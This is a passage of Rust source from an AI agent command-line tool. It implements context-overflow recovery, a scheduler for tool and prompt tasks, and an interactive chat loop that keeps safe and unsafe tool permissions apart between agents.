const MAX_TOOL_RESULT_SHRINKS: usize = 3;

/// Runs `request` on a copy of the agent's history, recovering if it fails
/// because the conversation no longer fits in the model's context window:
/// first by shortening the largest tool results (keeping the rest of the
/// history, including the current turn's progress), and if that isn't
/// enough, by summarizing the conversation.
fn request_with_summary_fallback<T>(
    agent: &mut AgentState,
    openai_opts: &openai::Opts,
    db: &Option<Arc<dyn DbBackend>>,
    ctrl_c_rx: &Arc<Mutex<mpsc::Receiver<()>>>,
    signal_handler_active: &Arc<AtomicBool>,
    status_bar: &Arc<status_bar::StatusBar>,
    chat_pb: &ChatPrinter,
    mut request: impl FnMut(Vec<Message>) -> Result<T, Box<dyn Error>>,
) -> Result<T, Box<dyn Error>> {
    let mut err = match request(agent.messages.clone()) {
        Err(e) => e,
        ok => return ok,
    };
    let Some(overflow) = err.downcast_ref::<openai::ContextLengthError>() else {
        return Err(err);
    };
    let mut history = overflow.history.clone();
    let mut overflow_message = overflow.message.clone();

    // Each round keeps whatever the turn has done since the last one, so a
    // long turn that keeps reading can keep going, with its oldest tool
    // results getting shorter each time.
    for _ in 0..MAX_TOOL_RESULT_SHRINKS {
        let Some(shrunk) = openai::shrink_tool_results(&history, &overflow_message) else {
            break;
        };
        chat_pb.println("Context length exceeded, shortening large tool results and retrying...");
        agent.messages = shrunk;
        agent.last_prompt_tokens = None;
        save_agent_history(db, agent);
        err = match request(agent.messages.clone()) {
            Err(e) => e,
            ok => return ok,
        };
        match err.downcast_ref::<openai::ContextLengthError>() {
            Some(overflow) => {
                history = overflow.history.clone();
                overflow_message = overflow.message.clone();
            }
            None => return Err(err),
        }
    }

    chat_pb.println("Context length exceeded, summarizing the conversation and retrying...");
    summarize_agent_history(
        agent,
        &history,
        true,
        openai_opts,
        db,
        ctrl_c_rx,
        signal_handler_active,
        status_bar,
        chat_pb,
    )
    .map_err(|e| -> Box<dyn Error> {
        if e.downcast_ref::<InterruptedError>().is_some() {
            e
        } else {
            format!("{} (summarization failed: {})", err, e).into()
        }
    })?;
    request(agent.messages.clone()).map_err(|e| {
        match e.downcast_ref::<openai::ContextLengthError>() {
            Some(overflow) => still_too_large_error(&overflow.message),
            None => e,
        }
    })
}

/// The error shown when a request still overflows the context window after
/// every recovery attempt, instead of the provider's raw error body.
fn still_too_large_error(provider_message: &str) -> Box<dyn Error> {
    let sizes = match openai::context_overflow_sizes(provider_message) {
        Some((prompt, context)) => {
            format!(
                " (the request needs {} tokens, the model has {})",
                prompt, context
            )
        }
        None => String::new(),
    };
    format!(
        "The request is still too large for the model's context window after shortening \
         tool results and summarizing{}. Ask for less at once (e.g. a range of a file, \
         or a narrower search), or use /clear to start over.",
        sizes
    )
    .into()
}

fn format_tool_output(output: &str) -> String {
    if let Ok(obj) = serde_json::from_str::<serde_json::Value>(output) {
        let mut parts = Vec::new();
        if let Some(stdout) = obj.get("stdout").and_then(|v| v.as_str()) {
            let s = stdout.trim();
            if !s.is_empty() {
                parts.push(s.to_string());
            }
        }
        if let Some(stderr) = obj.get("stderr").and_then(|v| v.as_str()) {
            let s = stderr.trim();
            if !s.is_empty() {
                parts.push(format!("stderr: {}", s));
            }
        }
        if parts.is_empty() {
            output.trim().to_string()
        } else {
            parts.join("\n")
        }
    } else {
        output.trim().to_string()
    }
}

fn execute_scheduled_command(
    command: &str,
    tools: &ToolsCollection,
    db: &Option<Arc<dyn DbBackend>>,
    run: &ToolTaskRun,
) -> Option<(Message, Message)> {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(command);
    let (tool_name, arguments) = match parsed {
        Ok(obj) => {
            let name = obj
                .get("tool")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let args = match obj.get("arguments") {
                Some(a) if a.is_string() => a.as_str().unwrap().to_string(),
                Some(a) => a.to_string(),
                None => "{}".to_string(),
            };
            (name, args)
        }
        Err(_) => return None,
    };

    if tool_name.is_empty() {
        return None;
    }

    let call_id = format!("scheduled-task-{}", chrono::Utc::now().timestamp_millis());

    let tc = ToolCall {
        index: None,
        id: call_id.clone(),
        tool_type: "function".to_string(),
        function: FunctionCall {
            name: tool_name.clone(),
            arguments,
        },
    };

    let mut tool_context = ToolContext::new(|_: &str| {});
    tool_context.db = db.clone();
    // A fixed tool call, with no model to read files first.
    tool_context.file_versions = None;
    // Where the task runs - its own directory, else its agent's - and
    // with what it may do, as its tools are.
    tool_context.cwd = run.cwd.clone().map(PathBuf::from);
    tool_context.unsafe_tools = run.unsafe_tools;
    tool_context.task_id = run.task_id;
    tool_context.agent_name = run.agent_name.clone();

    let tool_msg = match tool_call(tools, &tc, &tool_context) {
        Ok(msg) => msg,
        Err(e) => Message {
            role: "tool".to_string(),
            content: Some(format!("error: {}", e)),
            tool_call_id: Some(call_id),
            name: Some(tool_name),
            tool_calls: None,
        },
    };

    let assistant_msg = Message {
        role: "assistant".to_string(),
        content: None,
        tool_call_id: None,
        name: None,
        tool_calls: Some(vec![tc]),
    };

    Some((assistant_msg, tool_msg))
}

/// Most of a task's output kept in `last_result`.
const MAX_TASK_RESULT_CHARS: usize = 2000;

/// Most of a tool task's output kept: its output is what it's run for
/// (e.g. a knowledge base note, from the web UI's Run a tool).
const MAX_TOOL_TASK_RESULT_CHARS: usize = 32_000;

/// How a task's run went, from its tool result (`None`: its command isn't
/// a tool call at all). `run_command` reports success and an exit code;
/// any other tool failed if its result is an `error: ...`.
fn task_outcome(tool_msg: Option<&Message>) -> db::TaskOutcome {
    let Some(content) = tool_msg.and_then(|m| m.content.as_deref()) else {
        return db::TaskOutcome {
            succeeded: false,
            exit_code: None,
            result: r#"the task's command isn't a {"tool": ..., "arguments": ...} object"#
                .to_string(),
        };
    };
    let truncate = |s: &str| openai::truncate_tool_output(s.trim(), MAX_TOOL_TASK_RESULT_CHARS);
    if let Ok(json) = serde_json::from_str::<serde_json::Value>(content) {
        if let Some(success) = json.get("success").and_then(|s| s.as_bool()) {
            let output = [json["stdout"].as_str(), json["stderr"].as_str()]
                .into_iter()
                .flatten()
                .filter(|s| !s.trim().is_empty())
                .collect::<Vec<_>>()
                .join("\n");
            return db::TaskOutcome {
                succeeded: success,
                exit_code: json.get("exit_code").and_then(|c| c.as_i64()),
                result: truncate(&output),
            };
        }
    }
    db::TaskOutcome {
        succeeded: !content.starts_with("error:"),
        exit_code: None,
        result: truncate(content),
    }
}

/// Runs one claimed scheduled task to completion: `execute_scheduled_command`,
/// forwarding its result (if any) over `tx`, then recording how it went
/// with `finish_task` either way. Split out of `scheduler_loop` so each due
/// task can run on its own thread instead of blocking every other one.
/// The tools tool tasks run with: the session's, or - for one a safe
/// agent made (`run_safe`) - the safe ones, so it can't get an unsafe
/// tool run that way.
struct ToolTaskTools {
    session: ToolsCollection,
    session_unsafe: bool,
    safe: ToolsCollection,
}

/// What a tool task's call runs with, besides its tools.
#[derive(Default)]
struct ToolTaskRun {
    cwd: Option<String>,
    unsafe_tools: bool,
    task_id: Option<i64>,
    /// Who it acts as: for one a safe agent made, `task #<id>` - no agent
    /// at all, so it sends no message as one, and what it writes isn't
    /// taken for the user's. `None`, the user's own: as the user.
    agent_name: Option<String>,
}

impl ToolTaskTools {
    fn new(opts: &Opts) -> Self {
        let available = session_tools(opts);
        let config = db::AgentConfig::default();
        Self {
            session: agent_tools(&available, opts.unsafe_tools, &config),
            session_unsafe: opts.unsafe_tools,
            safe: agent_tools(&available, false, &config),
        }
    }

    fn for_task(&self, task: &db::TaskRow) -> (&ToolsCollection, bool) {
        if task.run_safe {
            (&self.safe, false)
        } else {
            (&self.session, self.session_unsafe)
        }
    }
}

fn run_scheduled_task(
    task: db::TaskRow,
    db: Arc<dyn DbBackend>,
    session_id: &str,
    tools: Arc<ToolTaskTools>,
    tx: mpsc::Sender<(Option<String>, String, Message, Message)>,
) {
    let command = task.command.clone();

    let db_opt: Option<Arc<dyn DbBackend>> = Some(db.clone());
    let (task_tools, unsafe_tools) = tools.for_task(&task);
    let cwd = task.cwd.clone().or_else(|| {
        let agent = task.agent_name.as_deref()?;
        db.get_agent_config(agent).ok()?.cwd
    });
    let run = ToolTaskRun {
        cwd,
        unsafe_tools,
        task_id: Some(task.id),
        agent_name: task.run_safe.then(|| format!("task #{}", task.id)),
    };
    let executed = execute_scheduled_command(&command, task_tools, &db_opt, &run);
    let outcome = task_outcome(executed.as_ref().map(|(_, tool_msg)| tool_msg));
    // Into its agent's conversation, as a call it made - but not one a
    // safe agent made: that would let it put words, and a tool call, in
    // the mouth of an agent it may not even message. Its result stays in
    // the task, for task_wait.
    if let (Some((assistant_msg, tool_msg)), false) = (executed, task.run_safe) {
        let _ = tx.send((task.agent_name.clone(), command, assistant_msg, tool_msg));
    }

    if let Err(e) = db.finish_task(task.id, session_id, &outcome) {
        warn!("Couldn't record the outcome of task {}: {}", task.id, e);
    }
}

/// Claims the next due prompt task (`TaskKind::PROMPT`) that `agent` may
/// take - one for any agent, for it by name, or for one of `profiles` (to
/// run on a new agent made from it) - for this idle session.
#[cfg(test)]
fn claim_prompt_task(
    db: &dyn DbBackend,
    session_id: &str,
    agent: &str,
    profiles: &[String],
) -> Option<db::TaskRow> {
    claim_prompt_task_but(db, session_id, agent, profiles, false, false)
}

/// `claim_prompt_task`, but with `busy`, none of those for `agent` by
/// name: it's already running one, and only one can run as it at a time.
/// With `only_unsafe`, none that must run on an agent without unsafe
/// tools (`run_safe`): for a chat whose agent has them, which can only
/// run a task as itself.
fn claim_prompt_task_but(
    db: &dyn DbBackend,
    session_id: &str,
    agent: &str,
    profiles: &[String],
    busy: bool,
    only_unsafe: bool,
) -> Option<db::TaskRow> {
    let tasks = db.get_pending_tasks().ok()?;
    tasks
        .into_iter()
        .filter(|t| t.kind == db::TaskKind::PROMPT)
        .filter(|t| t.agent_name.as_deref().is_none_or(|a| a == agent))
        .filter(|t| !(busy && task_is_for_worker(t)))
        .filter(|t| !(only_unsafe && t.run_safe))
        .filter(|t| t.profile.as_ref().is_none_or(|p| profiles.contains(p)))
        .find(|t| db.claim_task(t.id, session_id).unwrap_or(false))
}

/// The outcome of a prompt task's turn: what the agent reported with
/// `report_result` if it did, else its final answer, or why the turn
/// failed.
fn reported_task_outcome(
    result: Result<&OpenAIResponse, &Box<dyn Error>>,
    slot: &Arc<Mutex<Option<faber::ReportedResult>>>,
) -> db::TaskOutcome {
    match slot.lock().unwrap_or_else(|e| e.into_inner()).take() {
        Some(reported) => db::TaskOutcome {
            succeeded: reported.succeeded,
            exit_code: None,
            result: openai::truncate_tool_output(&reported.text(), MAX_TASK_RESULT_CHARS),
        },
        None => prompt_task_outcome(result),
    }
}

/// The outcome of a prompt task's turn: the agent's final answer, or why
/// the turn failed.
fn prompt_task_outcome(result: Result<&OpenAIResponse, &Box<dyn Error>>) -> db::TaskOutcome {
    match result {
        Ok(response) => db::TaskOutcome {
            succeeded: true,
            exit_code: None,
            result: openai::truncate_tool_output(
                response
                    .choices
                    .as_ref()
                    .and_then(|c| c.first())
                    .and_then(|c| c.message.content.as_deref())
                    .unwrap_or("")
                    .trim(),
                MAX_TASK_RESULT_CHARS,
            ),
        },
        Err(e) => db::TaskOutcome {
            succeeded: false,
            exit_code: None,
            result: e.to_string(),
        },
    }
}

/// Polls for due scheduled tasks once a second and runs each one this
/// session manages to claim (`claim_task`), each on its own thread. The
/// claim is what keeps two sessions sharing a database - or a task still
/// running when it next comes due - from running the same task twice.
fn scheduler_loop(
    db: Arc<dyn DbBackend>,
    session_id: String,
    tools: Arc<ToolTaskTools>,
    tx: mpsc::Sender<(Option<String>, String, Message, Message)>,
) {
    loop {
        std::thread::sleep(Duration::from_secs(1));
        // A task whose dependency failed can never run: fail it too.
        let _ = db.fail_tasks_with_failed_dependencies();
        let tasks = match db.get_pending_tasks() {
            Ok(t) => t,
            Err(_) => continue,
        };

        // Prompt tasks are for agents, picked up by idle chat sessions
        // (`claim_prompt_task`), not run here.
        for task in tasks.into_iter().filter(|t| t.kind == db::TaskKind::TOOL) {
            match db.claim_task(task.id, &session_id) {
                Ok(true) => {}
                Ok(false) => continue, // another session (or run) got it
                Err(e) => {
                    warn!("Couldn't claim task {}: {}", task.id, e);
                    continue;
                }
            }
            let db = db.clone();
            let session_id = session_id.clone();
            let tools = tools.clone();
            let tx = tx.clone();
            std::thread::spawn(move || {
                run_scheduled_task(task, db, &session_id, tools, tx);
            });
        }
    }
}

/// Interactive session
fn chat_command(
    opts: &Opts,
    db: Option<Arc<dyn DbBackend>>,
    db_conn: Option<Arc<Mutex<rusqlite::Connection>>>,
    mcp_manager: Option<Arc<faber::mcp::McpManager>>,
) -> Result<(), Box<dyn Error>> {
    debug!("Executing chat command");
    let opts = &with_db_profiles(opts, &db);

    let status_bar = Arc::new(status_bar::StatusBar::new());
    let chat_pb = ChatPrinter::new();

    // Create rustyline editor with history
    let initial_agent_names = if let Some(ref db) = db {
        db.list_agents()?.iter().map(|a| a.name.clone()).collect()
    } else {
        vec!["default".to_string()]
    };
    let agent_names = Arc::new(Mutex::new(initial_agent_names));
    let helper = ChatHelper {
        agent_names: agent_names.clone(),
    };
    let config = rustyline::Config::builder().auto_add_history(true).build();
    let history = DbHistory::new(db_conn);
    let mut rl = Editor::with_history(config, history)?;
    rl.set_helper(Some(helper));

    // Each turn's agent gets its own of these (see `agent_tools`).
    let available_tools = session_tools(opts);

    let session_id = format!(
        "{}-{}",
        std::process::id(),
        chrono::Utc::now().timestamp_millis()
    );
    let active_subagents = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let running_subagents: RunningSubAgents = Arc::new(Mutex::new(HashMap::new()));
    let sub_agent_runs: Arc<SubAgentRuns> = Arc::new(SubAgentRuns::default());
    // What the chat's agent has read of each file, across its turns.
    let file_versions = Arc::new(Mutex::new(HashMap::new()));
    let initial_agent_name = opts.agent.clone().unwrap_or_else(|| "default".to_string());

    let profile = opts
        .profile
        .as_deref()
        .map(|name| find_profile(&opts.profiles, name).map(|p| (name, p)))
        .transpose()?;
    let agent_config = if let Some(ref db) = db {
        db.ensure_default_agent()?;
        if initial_agent_name != "default" {
            if db.get_agent(&initial_agent_name)?.is_none() {
                db.create_agent(&initial_agent_name, "")?;
            }
        }
        if !db.claim_agent(&initial_agent_name, &session_id)? {
            return Err(format!(
                "Agent '{}' is already claimed by another session.",
                initial_agent_name
            )
            .into());
        }
        if let Some((name, profile)) = profile {
            apply_profile(db.as_ref(), &initial_agent_name, name, profile)?;
        }
        db.get_agent_config(&initial_agent_name)?
    } else {
        profile
            .map(|(name, profile)| profile.agent_config(name))
            .unwrap_or_default()
    };
    // The starting agent's, for its system prompt and /tools; each turn
    // works out the tools of the agent it's for.
    let tools = agent_tools(
        &available_tools,
        session_agent_unsafe(opts, &agent_config),
        &agent_config,
    );
    if let Some(db) = &db {
        if session_agent_unsafe(opts, &agent_config) {
            mark_session_unsafe(db.as_ref(), &initial_agent_name, &session_id);
        }
    }

    let initial_messages = if let Some(ref db) = db {
        let vals = db.load_agent_messages(&initial_agent_name)?;
        let loaded: Vec<Message> = vals
            .into_iter()
            .map(|v| serde_json::from_value(v).unwrap())
            .collect();
        if loaded.is_empty() {
            initialize_agent_messages(&tools, opts, &agent_config)
        } else {
            loaded
        }
    } else {
        initialize_agent_messages(&tools, opts, &agent_config)
    };

    let mut active_agent = AgentState {
        name: initial_agent_name.clone(),
        messages: initial_messages,
        last_prompt_tokens: None,
    };
    status_bar.set_color(agent_ansi_code(&active_agent.name));
    if let Some(ref db) = db {
        refresh_plan_status(&status_bar, db.as_ref(), &active_agent.name);
    }

    if opts.display_graphics.is_some() {
        warn_about_display_graphics_setup(&chat_pb);
    }

    let mut openai_opts = build_openai_opts(opts, &agent_config);
    debug!("Using model: {}", openai_opts.model);

    // Populated from --context-window directly, or (if that wasn't given)
    // filled in later, in the background, by spawn_model_metadata_lookup -
    // see maybe_summarize_proactively for what it's used for. `pricing` has
    // no CLI override (a hardcoded price wouldn't make much sense) - always
    // whatever the background lookup finds, if anything, used by /cost to
    // show an estimated dollar amount. Note: if /select-agent later
    // switches to a different agent with a different model/endpoint,
    // both keep whatever they already had rather than re-looking up - a
    // known, accepted limitation (proactive summarization may fire a
    // little early or late for the new agent until the cache would
    // naturally be right again, and /cost's estimate may reflect the
    // wrong model's price for tokens used under a previous one), not a
    // correctness issue: the existing reactive fallback in
    // request_with_summary_fallback still fully covers an actual context
    // overflow regardless, and /cost's raw token counts are always
    // accurate even if the price estimate briefly isn't.
    let configured_window = agent_config.context_window.or(opts.context_window);
    let context_window: Arc<Mutex<Option<u32>>> = Arc::new(Mutex::new(configured_window));
    let model_pricing: Arc<Mutex<Option<openai::Pricing>>> = Arc::new(Mutex::new(None));
    spawn_model_metadata_lookup(
        context_window.clone(),
        configured_window.is_some(),
        model_pricing.clone(),
        openai_opts.endpoint.clone(),
        openai_opts.api_key.clone(),
        openai_opts.model.clone(),
    );
    let session_usage: Arc<Mutex<SessionUsage>> = Arc::new(Mutex::new(SessionUsage::default()));

    let prompt_text = Arc::new(Mutex::new(format!(
        "{}",
        agent_style(&initial_agent_name).apply_to(format!("{}> ", initial_agent_name))
    )));
    let session_id = Arc::new(session_id);

    let (ctrl_c_tx, ctrl_c_rx) = mpsc::channel();
    let ctrl_c_rx = Arc::new(Mutex::new(ctrl_c_rx));

    let signal_handler_active = Arc::new(AtomicBool::new(false));

    let ctrl_c_tx_clone = ctrl_c_tx.clone();
    let signal_handler_active_clone = signal_handler_active.clone();
    ctrlc::set_handler(move || {
        if signal_handler_active_clone.load(Ordering::Relaxed) {
            debug!("Received SIGINT (Ctrl-C) - sending interrupt signal");
            let _ = ctrl_c_tx_clone.send(());
        }
    })
    .expect("Error setting up Ctrl-C handler");

    // A task this session is running that's asked to stop (`faber tasks
    // stop`, the web UI) is interrupted like Ctrl-C would; so is an agent
    // it runs that's asked to: its sub-agents, or its own turn.
    if let Some(ref db) = db {
        let db = db.clone();
        let session = session_id.to_string();
        let ctrl_c_tx = ctrl_c_tx.clone();
        let signal_handler_active = signal_handler_active.clone();
        let running_subagents = running_subagents.clone();
        std::thread::spawn(move || {
            loop {
                std::thread::sleep(Duration::from_millis(500));
                handle_agent_stops(db.as_ref(), &session, &running_subagents, &|| {
                    if signal_handler_active.load(Ordering::Relaxed) {
                        let _ = ctrl_c_tx.send(());
                    }
                });
                // Only while a turn runs: that's when a task could.
                if !signal_handler_active.load(Ordering::Relaxed) {
                    continue;
                }
                let stopping = db.list_tasks(None).is_ok_and(|tasks| {
                    tasks.iter().any(|t| {
                        t.stop_requested && t.claimed_by.as_deref() == Some(session.as_str())
                    })
                });
                if stopping {
                    let _ = ctrl_c_tx.send(());
                }
            }
        });
    }

    let (task_tx, task_rx) = mpsc::channel::<(Option<String>, String, Message, Message)>();
    if let Some(ref scheduler_db) = db {
        let heartbeat_db = scheduler_db.clone();
        let heartbeat_session = session_id.clone();

        let scheduler_db_for_prune = scheduler_db.clone();
        let scheduler_db = scheduler_db.clone();
        let scheduler_tools = Arc::new(ToolTaskTools::new(opts));
        let scheduler_session = session_id.to_string();
        std::thread::spawn(move || {
            scheduler_loop(scheduler_db, scheduler_session, scheduler_tools, task_tx);
        });
        if let Some(retention) = opts.task_retention.as_deref().and_then(parse_duration) {
            let prune_db = scheduler_db_for_prune.clone();
            std::thread::spawn(move || {
                loop {
                    let cutoff = (chrono::Utc::now() - retention).to_rfc3339();
                    match prune_db.prune_tasks(&cutoff, false) {
                        Ok(pruned) if !pruned.is_empty() => {
                            debug!("Pruned {} old task(s)", pruned.len())
                        }
                        Ok(_) => {}
                        Err(e) => warn!("Couldn't prune old tasks: {}", e),
                    }
                    std::thread::sleep(Duration::from_secs(3600));
                }
            });
        }
        std::thread::spawn(move || {
            for beat in 1u64.. {
                std::thread::sleep(Duration::from_secs(5));
                let _ = heartbeat_db.heartbeat_all(&heartbeat_session);
                if beat % 12 == 0 {
                    if let Err(e) = remove_one_job_agents_done(heartbeat_db.as_ref()) {
                        debug!("Couldn't remove finished agents: {}", e);
                    }
                }
            }
        });
    }

    let (input_tx, input_rx) = mpsc::channel::<Result<String, rustyline::error::ReadlineError>>();
    let (ready_tx, ready_rx) = mpsc::channel::<()>();

    chat_pb.set_printer(Box::new(rl.create_external_printer()?));

    let prompt_text_clone = prompt_text.clone();
    let ctrl_c_tx_for_input = ctrl_c_tx.clone();
    let turn_running = signal_handler_active.clone();
    std::thread::spawn(move || {
        loop {
            if ready_rx.recv().is_err() {
                break;
            }
            let prompt = prompt_text_clone
                .lock()
                .map(|p| p.clone())
                .unwrap_or_else(|_| "> ".to_string());
            let result = rl.readline(&prompt);
            // A turn can start while the prompt is still up - a scheduled
            // task or another agent's message, injected while idle - and
            // then the terminal is in rustyline's raw mode, where Ctrl-C
            // is a key it reads rather than a signal. Pass it on as one, so
            // it interrupts the turn as it would a typed message's.
            if matches!(result, Err(rustyline::error::ReadlineError::Interrupted))
                && turn_running.load(Ordering::Relaxed)
            {
                let _ = ctrl_c_tx_for_input.send(());
            }
            let is_eof = matches!(result, Err(rustyline::error::ReadlineError::Eof));
            let _ = input_tx.send(result);
            if is_eof {
                break;
            }
        }
    });

    let mut prompt_shown = false;
    // A prompt task this session claimed and is running as the current
    // injected turn, and when the last check for one was.
    let mut running_prompt_task: Option<i64> = None;
    // The directory each agent was last told it works in.
    let mut told_cwd: HashMap<String, PathBuf> = HashMap::new();
    let mut last_prompt_task_poll = std::time::Instant::now();

    loop {
        while let Ok((task_agent, command, assistant_msg, tool_msg)) = task_rx.try_recv() {
            let target = task_agent.as_deref().unwrap_or("default");

            chat_pb.println_agent(target, &format!("Scheduled task fired: {}", command));
            if target != active_agent.name {
                if let Some(ref db) = db {
                    let assistant_val = serde_json::to_value(&assistant_msg).unwrap();
                    let tool_val = serde_json::to_value(&tool_msg).unwrap();
                    let _ = db.append_agent_message(target, &assistant_val);
                    let _ = db.append_agent_message(target, &tool_val);
                }
            }
            if let Some(ref output) = tool_msg.content {
                chat_pb.println_agent(target, &format_tool_output(output));
            }
            if target == active_agent.name {
                active_agent.messages.push(assistant_msg);
                active_agent.messages.push(tool_msg);
            }
        }

        let mut pending_injections: Vec<String> = Vec::new();
        if let Some(ref db) = db {
            if let Ok(notifications) = db.poll_notifications_for_session(&session_id) {
                for notif in notifications {
                    let display_msg = if let Ok(obj) =
                        serde_json::from_str::<serde_json::Value>(&notif.message)
                    {
                        if obj.get("type").and_then(|v| v.as_str()) == Some("subagent_result") {
                            if let Some(agent) = obj.get("agent").and_then(|v| v.as_str()) {
                                // Kept, with its transcript, for `faber
                                // agents` until `faber gc`.
                                status_bar.clear_agent_status(agent);
                                status_bar.set_agent_plan(agent, None);
                            }
                            // Already handed over by agent_wait.
                            if obj["run"]
                                .as_u64()
                                .is_some_and(|run| sub_agent_runs.was_delivered(run))
                            {
                                continue;
                            }
                            obj.get("response")
                                .and_then(|v| v.as_str())
                                .unwrap_or(&notif.message)
                                .to_string()
                        } else {
                            notif.message.clone()
                        }
                    } else {
                        notif.message.clone()
                    };
                    // What a safe agent sends is checked when it's
                    // sent, but the agent may have been idle then, and is
                    // now run with the unsafe tools: such a message only
                    // reaches it from its own sub-agents.
                    let config = db.get_agent_config(&active_agent.name).unwrap_or_default();
                    if !accepts_message(
                        db.as_ref(),
                        &active_agent.name,
                        session_agent_unsafe(opts, &config),
                        &notif.from_agent,
                    ) {
                        chat_pb.println(&format!(
                            "Dropped a message from '{}': it doesn't have the unsafe tools, and '{}' does",
                            notif.from_agent, active_agent.name
                        ));
                        continue;
                    }
                    chat_pb.println_agent(&notif.from_agent, &display_msg);
                    pending_injections.push(format!(
                        "[Message from agent '{}']: {}",
                        notif.from_agent, notif.message
                    ));
                }
            }
        }
        // Idle, with nothing else to inject: take a due prompt task meant
        // for this agent (or any agent), if there is one.
        if pending_injections.is_empty()
            && last_prompt_task_poll.elapsed() >= Duration::from_secs(1)
        {
            last_prompt_task_poll = std::time::Instant::now();
            if let Some(ref db) = db {
                if let Some(task) = claim_prompt_task_but(
                    db.as_ref(),
                    &session_id,
                    &active_agent.name,
                    &[],
                    false,
                    db.get_agent_config(&active_agent.name)
                        .is_ok_and(|config| session_agent_unsafe(opts, &config)),
                ) {
                    chat_pb.println(&format!(
                        "Picked up scheduled task #{} \"{}\"",
                        task.id, task.name
                    ));
                    // Never starts with "/", so it can't be taken for a
                    // chat command.
                    pending_injections.push(format!(
                        "[Scheduled task #{} \"{}\"]: {}",
                        task.id, task.name, task.command
                    ));
                    running_prompt_task = Some(task.id);
                }
            }
        }
        let pending_injection: Option<String> = if pending_injections.is_empty() {
            None
        } else {
            Some(pending_injections.join("\n"))
        };

        let is_injected = pending_injection.is_some();
        let line = if let Some(injected) = pending_injection {
            injected
        } else {
            if !prompt_shown {
                let count = active_subagents.load(std::sync::atomic::Ordering::Relaxed);
                if count > 0 {
                    chat_pb.println(&format!("  {} subagent(s) running in background...", count));
                }
                chat_pb.set_direct_mode(false);
                status_bar.pause();
                let _ = ready_tx.send(());
                prompt_shown = true;
            }

            match input_rx.recv_timeout(Duration::from_millis(200)) {
                Ok(Ok(line)) => {
                    status_bar.resume();
                    chat_pb.set_direct_mode(true);
                    line.trim().to_string()
                }
                Ok(Err(rustyline::error::ReadlineError::Interrupted)) => {
                    status_bar.resume();
                    chat_pb.set_direct_mode(true);
                    prompt_shown = false;
                    continue;
                }
                Ok(Err(rustyline::error::ReadlineError::Eof)) => {
                    status_bar.resume();
                    chat_pb.set_direct_mode(true);
                    if let Some(ref db) = db {
                        let _ = db.release_all_agents(&session_id);
                    }
                    return Ok(());
                }
                Ok(Err(err)) => {
                    status_bar.resume();
                    chat_pb.set_direct_mode(true);
                    return Err(Box::new(err));
                }
                Err(mpsc::RecvTimeoutError::Timeout) => {
                    continue;
                }
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    status_bar.resume();
                    if let Some(ref db) = db {
                        let _ = db.release_all_agents(&session_id);
                    }
                    return Ok(());
                }
            }
        };

        if !is_injected {
            prompt_shown = false;
        }

        debug!("User input: '{}' (length: {})", line, line.len());

        let command = parse_chat_command(&line);
        let handled = match handle_chat_command(
            command,
            &mut active_agent,
            &tools,
            opts,
            &chat_pb,
            &db,
            &mut openai_opts,
            &prompt_text,
            &agent_names,
            &session_id,
            &mcp_manager,
            &status_bar,
            &session_usage,
            &model_pricing,
            &running_subagents,
        ) {
            Ok(handled) => handled,
            Err(e) => {
                chat_pb.println(&format!("Error: {}", e));
                continue;
            }
        };
        match handled {
            true => continue,
            false => {
                if let ChatCommand::Quit = parse_chat_command(&line) {
                    if let Some(ref db) = db {
                        let msgs: Vec<serde_json::Value> = active_agent
                            .messages
                            .iter()
                            .map(|m| serde_json::to_value(m).unwrap())
                            .collect();
                        let _ = db.save_agent_messages(&active_agent.name, &msgs);
                        let _ = db.release_all_agents(&session_id);
                    }
                    return Ok(());
                }
                if let ChatCommand::Message(user_message) = parse_chat_command(&line) {
                    let events = db.as_ref().map(|db| {
                        EventLog::new(db.clone(), &active_agent.name, running_prompt_task)
                    });
                    if let Some(events) = &events {
                        events.emit(AgentEvent::Input {
                            text: user_message.clone(),
                        });
                    }
                    active_agent
                        .messages
                        .push(make_message("user", user_message));
                    let activity = db
                        .as_ref()
                        .map(|db| ActivityRecorder::new(db.clone(), &active_agent.name));
                    if let Some(activity) = &activity {
                        activity.set("thinking");
                    }
                    let _idle_when_done = IdleWhenDone(activity.clone());

                    // This agent's tools: unsafe or not, and narrowed by
                    // its own list.
                    let turn_config = db
                        .as_ref()
                        .and_then(|db| db.get_agent_config(&active_agent.name).ok())
                        .unwrap_or_else(|| agent_config.clone());
                    let turn_unsafe = session_agent_unsafe(opts, &turn_config);
                    let turn_tools = agent_tools(&available_tools, turn_unsafe, &turn_config);

                    let mut tool_context = ToolContext::new(|_: &str| {});
                    tool_context.db = db.clone();
                    tool_context.agent_name = Some(active_agent.name.clone());
                    tool_context.mcp = session_mcp(&mcp_manager, &turn_config, opts);
                    tool_context.unsafe_tools = turn_unsafe;
                    tool_context.task_id = running_prompt_task;
                    if turn_unsafe && turn_config.unsafe_tools != Some(true) {
                        if let Some(db) = &db {
                            mark_session_unsafe(db.as_ref(), &active_agent.name, &session_id);
                        }
                    }
                    // A task's own directory, else the agent's.
                    let task_cwd = running_prompt_task
                        .and_then(|id| db.as_ref()?.get_task(id).ok()?)
                        .and_then(|task| task.cwd);
                    tool_context.cwd = task_cwd.or(turn_config.cwd.clone()).map(PathBuf::from);
                    let here = tool_context.cwd();
                    if told_cwd.get(&active_agent.name) != Some(&here) {
                        // Before the message it's for.
                        let at = active_agent.messages.len().saturating_sub(1);
                        active_agent
                            .messages
                            .insert(at, working_directory_note(&here));
                        told_cwd.insert(active_agent.name.clone(), here);
                    }
                    if let Some(id) = running_prompt_task {
                        let at = active_agent.messages.len().saturating_sub(1);
                        active_agent.messages.insert(at, running_task_note(id));
                    }
                    if let Some(cwd) = tool_context.cwd.as_ref().filter(|c| !c.is_dir()) {
                        chat_pb.println(&format!(
                            "Warning: '{}' works in {}, which isn't a directory here (/cwd to change it)",
                            active_agent.name,
                            cwd.display()
                        ));
                    }
                    // Re-read every turn: the window may only have been
                    // found by the background /models lookup since startup.
                    tool_context.context_window =
                        *context_window.lock().unwrap_or_else(|e| e.into_inner());
                    tool_context.extra = Some(Arc::new(SubAgentContext {
                        runs: sub_agent_runs.clone(),
                        tools: Arc::new(turn_tools.clone()),
                        opts: openai_opts.clone(),
                        session_id: session_id.to_string(),
                        active_subagents: active_subagents.clone(),
                        running_subagents: running_subagents.clone(),
                        status_bar: status_bar.clone(),
                        session_usage: session_usage.clone(),
                        // Read again each turn: they may have changed.
                        profiles: Arc::new(session_profiles(opts, db.as_deref())),
                    }));
